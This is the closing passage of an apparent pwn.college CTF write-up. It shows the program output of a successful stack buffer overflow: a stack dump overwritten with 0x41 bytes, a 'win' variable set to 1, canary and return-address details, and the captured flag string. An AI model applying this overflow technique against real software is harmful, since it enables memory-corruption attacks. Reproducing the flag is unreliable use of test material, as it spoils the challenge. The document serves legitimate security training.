41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffddb86e818 (rsp+0x0068) | 41 41 41 41 01 00 00 00 | 0x0000000141414141 |\n| 0x00007ffddb86e820 (rsp+0x0070) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |\n| 0x00007ffddb86e828 (rsp+0x0078) | 00 69 6b 63 06 ce 35 5c | 0x5c35ce06636b6900 |\n| 0x00007ffddb86e830 (rsp+0x0080) | 70 f8 86 db fd 7f 00 00 | 0x00007ffddb86f870 |\n| 0x00007ffddb86e838 (rsp+0x0088) | 36 28 40 00 00 00 00 00 | 0x0000000000402836 |\n+---------------------------------+-------------------------+--------------------+\nThe program\'s memory status:\n- the input buffer starts at 0x7ffddb86e7e0\n- the saved frame pointer (of main) is at 0x7ffddb86e830\n- the saved return address (previously to main) is at 0x7ffddb86e838\n- the saved return address is now pointing to 0x402836.\n- the canary is stored at 0x7ffddb86e828.\n- the canary value is now 0x5c35ce06636b6900.\n- the address of the win variable is 0x7ffddb86e81c.\n- the value of the win variable is 0x1.\n\nYou win! Here is your flag:\npwn.college{028ZqHhq93fLat68HKK5UNA96NK.0VO4IDLzQjN0czW}\n\n\nGoodbye!\n'

In [5]:
```


`so here it has worked as we planned` and we got the flag.

this concludes the writeup for me.

we will do something similar for the next chall.



